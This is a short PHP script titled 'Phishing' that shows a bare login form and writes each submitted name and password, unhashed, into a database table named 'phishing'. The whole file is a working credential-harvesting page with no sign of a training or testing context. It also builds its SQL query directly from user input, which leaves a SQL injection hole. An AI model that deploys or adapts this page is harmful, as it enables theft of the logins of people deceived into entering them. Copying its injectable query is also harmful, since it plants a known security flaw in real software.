<?php header( "Content-Type: text/html; charset=UTF-8" );
$title = 'Phishing';
include 'head.php';
include 'menu.php';
include 'db.php';


if(isset($_POST['login']))

{


if ((!empty($_POST['name'])) && (!empty($_POST['pass']))) 


{


 $name = $_POST['name'] ;
$pass= $_POST['pass'] ;
 
mysql_select_db("alesg6db", $con);
$sql="INSERT INTO phishing (email, heslo)
VALUES
('$name','$pass')";
if (!mysql_query($sql,$con))
  {
  die('Error: ' . mysql_error());
  }   






}


}

?>



<form action="" method="post">

<input type="text" name="name"><br>
<input type="password" name="pass"><br>
<input type="submit" name="login">






</form>









 

















</body>
</html>